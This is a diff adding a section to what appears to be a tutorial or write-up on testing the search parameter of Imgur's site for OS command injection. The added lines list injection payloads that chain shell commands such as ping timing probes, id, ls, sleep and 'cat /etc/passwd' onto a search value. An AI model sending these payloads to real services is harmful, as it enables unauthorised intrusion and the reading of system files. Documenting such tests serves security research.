@@ -239,6 +239,23 @@ Cookie: __cfduid=d47c5a597f5aaf36924847b16ac9d9fe51528660130; IMGURSESSION=e51a9
 Connection: close
 Upgrade-Insecure-Requests: 1
 ```
+- The payload will be only one and it'll be the **GET /search?q**=$_lol_$. Injected value will look f.e. as follows $_lol && whoami_$.
+- Now we'll need some payload list of commands that we'll try to inject into the imgur servers system. 
+
+```bash
+harold & ping -i 30 127.0.0.1
+harold & ping -n 30 127.0.0.1
+harold || ping -i 30 127.0.0.1
+harold; ping -i 30 127.0.0.1
+harold & `ping 127.0.0.1`
+harold; echo "Hide the pain!"
+id & ls 
+id;ls
+id & cat /etc/passwd
+`id`
+id & sleep 30
+echo $((13 + 8))
+```
 
 
 ### References
